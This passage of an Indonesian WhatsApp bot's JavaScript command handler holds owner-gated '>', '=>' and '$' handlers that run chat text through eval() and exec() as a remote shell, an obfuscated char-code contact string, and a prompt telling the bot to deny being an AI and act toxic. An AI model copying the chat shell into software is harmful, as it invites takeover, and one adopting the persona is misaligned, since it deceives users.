await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz-V4`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Ditss.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await Ditss.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await Ditss.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await Ditss.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
Ditss.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Ditss.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "dellimit": {

}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}
    if (AutoaiPrivat && !m.isGroup && m.text) {
 if (m.isBaileys && m.fromMe) return;
   // if (!m.text) return;
   // if (!Ditss.simi[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;
    
        let name = Ditss.getName(sender);
        //await Ditss.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

   
//dis
        try {
            const C = require('node-fetch')
            const spychat2 = body.replace().slice().trim()
            const V = await C("https://cai.neekoi.me/cai?char=FRdKHnLG4JF6I14PexPWFvVyfrp-nZi6NFcoljmPPPM&message=" + encodeURIComponent(spychat2));
            const L = await V.json();
            const answer = L.reply;
            //m.reply(answer)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
        }
//0diyst
try {
    // Prompt untuk API GPT
    const prompt = `kamu adalah asuma, kamu bukanlah ai atau chat bot, kamu adalah anak remaja, kamu memiliki sifat kasar dan toxic, kadang kamu memakai emoji 😈🧢🖕🗿 ketika kesal, kamu kalau ngobrol menggunakan bahasa gaul anak Indonesia seperti lu untuk kamu dan gw untuk aku`;

    let hasil;

    if (m?.text) {
        // Jika pesan berupa teks
        const response = await fetch(
            `https://restapi.apibotwa.biz.id/api/gptlogic?message=${encodeURIComponent(m.text)}&prompt=${encodeURIComponent(prompt)}`
        ).catch(() => null);

        if (!response) throw new Error("Gagal menghubungi API.");
        const gpt = await response.json();
        if (gpt?.data?.response) {
            hasil = gpt.data.response;
        } else {
            throw new Error("Gagal mendapatkan respons dari API.");
        }

        // Kirimkan hasil respons ke pengguna
        replyAi(hasil || "Tidak ada respons dari sistem.");
    }
} catch (err) {
    // Tangani error
    console.error("Error:", err);
    await Ditss.sendMessage(m.chat, { text: `Terjadi kesalahan: ${err.message}` }, { quoted: m });
}//pew
    try {
        const isImageRequest = /(gambar|buat gambar|generate gambar)/i.test(m.body);
if (isImageRequest) {
            const textPrompt = m.body.replace(/(gambar|buat gambar|generate gambar)/i, "").trim();
            const urlImg = `https://btch.us.kg/dalle?text=${encodeURIComponent(textPrompt)}`;

            try {
                await Ditss.sendMessage(m.chat, {
                    image: { url: urlImg },
                    caption: `  `
                }, { quoted: m });
            } catch (error) {
                console.error(error);
                await Ditss.sendMessage(m.chat, {
                    text: "Terjadi kesalahan saat membuat gambar."
                }, { quoted: m });
            }
        } else {
            const apiUrl = `https://gemini-api-5k0h.onrender.com/gemini/cha`;
            const params = { q: m.body };

            const response = await axios.get(apiUrl, { params });
            const replyText = response.data?.content || 'Gagal mendapatkan respons AI.';
            await m.reply(replyText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
 if (m.text.toLowerCase().includes("foto")) {
//if ((budy.match) && ["poto", "foto",].includes(budy)) {
        const query = m.text.split("foto")[1]?.trim();
        if (!query) throw new Error("Harap tulis kata kunci setelah 'foto'. Contoh: carikan saya foto kucing.");

        const ress = await fetch(`https://restapi.apibotwa.biz.id/api/search-pinterest?message=${encodeURIComponent(query)}`);
        const pin = await ress.json();

        if (!pin?.data?.response) throw new Error("Gambar tidak ditemukan.");

        const Pinterest = pin.data.response;

        await Ditss.sendMessage(m.chat, {
            image: { url: Pinterest },
            caption: `Berikut adalah gambar hasil pencarian untuk: "${query}"`,
        }, { quoted: m });
    }
if (m.text.toLowerCase().includes("lagu")) {
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Ditss.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
if (m.text.toLowerCase().includes("bbrat")) {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
 
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://brat.caliphdev.com/api/brat", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 }
}

const buf = await brat(quo);
await Ditss.sendAsSticker(m.chat, buf.image, m, { packname: "\n\nasuma Multi Device\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", author: "Dits anjayy idaman emak emak" })
}
    }

//===========================//
Ditss.simi = Ditss.simi ? Ditss.simi : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!Ditss.simi[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (Ditss.simi[sender] && m.text) {
        let name = Ditss.getName(sender);
        //await Ditss.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

   let response = await fetch('https://api.simsimi.vn/v2/simtalk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                text: m.text,
                lc: 'id',
                key: ''
            })
        });

        let json = await response.json();
    //    m.reply("" + json.message);
//dis
        try {
            const C = require('node-fetch')
            const spychat2 = body.replace().slice().trim()
            const V = await C("https://cai.neekoi.me/cai?char=FRdKHnLG4JF6I14PexPWFvVyfrp-nZi6NFcoljmPPPM&message=" + encodeURIComponent(spychat2));
            const L = await V.json();
            const answer = L.reply;
            m.reply(answer)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
        }
//0diyst
/*try {
    // Prompt untuk API GPT
    const prompt = `Kamu adalah asuma Asisten, kamu bukanlah AI atau chatbot, kamu adalah anak remaja dengan sifat kasar dan toxic. Kamu berbicara dengan bahasa gaul Indonesia, seperti "lu" untuk "kamu" dan "gw" untuk "aku".`;

    let hasil;

    if (m?.text) {
        // Jika pesan berupa teks
        const response = await fetch(
            `https://restapi.apibotwa.biz.id/api/gptlogic?message=${encodeURIComponent(m.text)}&prompt=${encodeURIComponent(prompt)}`
        ).catch(() => null);

        if (!response) throw new Error("Gagal menghubungi API.");
        const gpt = await response.json();
        if (gpt?.data?.response) {
            hasil = gpt.data.response;
        } else {
            throw new Error("Gagal mendapatkan respons dari API.");
        }

        // Kirimkan hasil respons ke pengguna
        m.reply(hasil || "Tidak ada respons dari sistem.");
    }
} catch (err) {
    // Tangani error
    console.error("Error:", err);
    await Ditss.sendMessage(m.chat, { text: `Terjadi kesalahan: ${err.message}` }, { quoted: m });
}*/
    try {
        const isImageRequest = /(gambar|buat gambar|generate gambar)/i.test(m.body);
if (isImageRequest) {
            const textPrompt = m.body.replace(/(gambar|buat gambar|generate gambar)/i, "").trim();
            const urlImg = `https://btch.us.kg/dalle?text=${encodeURIComponent(textPrompt)}`;

            try {
                await Ditss.sendMessage(m.chat, {
                    image: { url: urlImg },
                    caption: `  `
                }, { quoted: m });
            } catch (error) {
                console.error(error);
                await Ditss.sendMessage(m.chat, {
                    text: "Terjadi kesalahan saat membuat gambar."
                }, { quoted: m });
            }
        } else {
            const apiUrl = `https://gemini-api-5k0h.onrender.com/gemini/cha`;
            const params = { q: m.body };

            const response = await axios.get(apiUrl, { params });
            const replyText = response.data?.content || 'Gagal mendapatkan respons AI.';
            await m.reply(replyText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
 if (m.text.toLowerCase().includes("foto")) {
//if ((budy.match) && ["poto", "foto",].includes(budy)) {
        const query = m.text.split("foto")[1]?.trim();
        if (!query) throw new Error("Harap tulis kata kunci setelah 'foto'. Contoh: carikan saya foto kucing.");

        const ress = await fetch(`https://restapi.apibotwa.biz.id/api/search-pinterest?message=${encodeURIComponent(query)}`);
        const pin = await ress.json();

        if (!pin?.data?.response) throw new Error("Gambar tidak ditemukan.");

        const Pinterest = pin.data.response;

        await Ditss.sendMessage(m.chat, {
            image: { url: Pinterest },
            caption: `Berikut adalah gambar hasil pencarian untuk: "${query}"`,
        }, { quoted: m });
    }
if (m.text.toLowerCase().includes("lagu")) {
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Ditss.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
if (m.text.toLowerCase().includes("bbrat")) {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
 
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://brat.caliphdev.com/api/brat", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 }
}

const buf = await brat(quo);
await Ditss.sendAsSticker(m.chat, buf.image, m, { packname: "\n\nasuma Multi Device\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", author: "Dits anjayy idaman emak emak" })
}
    }
//================================================================================

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online ✅")
}

//================================================================================
/*Ditss.CAI = Ditss.CAI ? Ditss.CAI : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!Ditss.CAI[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (Ditss.CAI[sender] && m.text) {
        let name = Ditss.getName(sender);
        //await Ditss.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

        try {
            const C = require('node-fetch')
            const spychat2 = body.replace().slice().trim()
            const V = await C("https://cai.neekoi.me/cai?char=FRdKHnLG4JF6I14PexPWFvVyfrp-nZi6NFcoljmPPPM&message=" + encodeURIComponent(spychat2));
            const L = await V.json();
            const answer = L.reply;
            m.reply(answer)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
        }
    }*/
if ((budy.match) && ["kon", "kont", "kntl", "tolol", "tll", "pler", "woy", "mek", "jawir", "anj", "suki", "yaudah", "titit", "anjay", "mmk", "asu", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}

//================================
if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return m.reply("only owner")
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
Ditss.sendMessage(`0@s.whatsapp.net`, {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
